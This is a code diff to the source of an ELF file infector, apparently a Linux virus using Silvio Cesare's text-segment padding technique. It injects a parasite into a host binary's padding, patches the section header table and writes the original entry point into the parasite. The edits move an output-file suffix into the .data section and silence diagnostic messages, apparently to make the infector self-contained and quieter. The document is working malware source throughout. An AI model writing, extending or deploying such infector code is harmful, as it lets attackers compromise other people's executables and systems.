@@ -1,8 +1,8 @@
 #include "infector/silvio.hh"
 #include <linux/elf.h>
 #include "common/file_descriptor.hh"
-#include "common/string.hh"
 #include "common/patch_pattern.hh"
+#include "common/string.hh"
 #include "std/string.hh"
 /********************  ALGORITHM   *********************
 
@@ -160,6 +160,7 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
   return false;
 }
 
+__attribute__((__section__(".data"))) const char* kOutputPostfix = ".bak";
 }  // namespace
 
 bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
@@ -176,12 +177,12 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Get Home size (in bytes) of parasite residence in host
   // and check if host's home size can accomodate a parasite this big in size
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
-    printf("Cannot correctly parse host elf\n");
+    //printf("Cannot correctly parse host elf\n");
     return false;
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    printf("[+] Host cannot accomodate parasite\n");
+    //printf("[+] Host cannot accomodate parasite\n");
     return false;
   }
 
@@ -191,7 +192,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch section header table to increase text section size
   if (!patch_sht(host_mapping, parasite_mapping.size(),
                  info.code_segment_end_offset)) {
-    printf("Failed to patch section header table\n");
+    //printf("Failed to patch section header table\n");
     return false;
   }
 
@@ -206,7 +207,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   if (!vt::common::patch<Elf64_Addr>(
           host_mapping.mutable_base() + info.parasite_offset,
           parasite_mapping.size(), 0xAAAAAAAAAAAAAAAA, original_entry_point)) {
-    printf("Failed to patch parasite pattern\n");
+    //printf("Failed to patch parasite pattern\n");
     return false;
   }
   return true;
@@ -224,7 +225,8 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
     return false;
   }
   common::String tmp(host_path);
-  tmp += ".bak";
+
+  tmp += kOutputPostfix;
   vt::common::FileDescriptor output(tmp.c_str(), O_RDWR | O_CREAT, S_IRWXU);
 
   if (!output.valid()) {
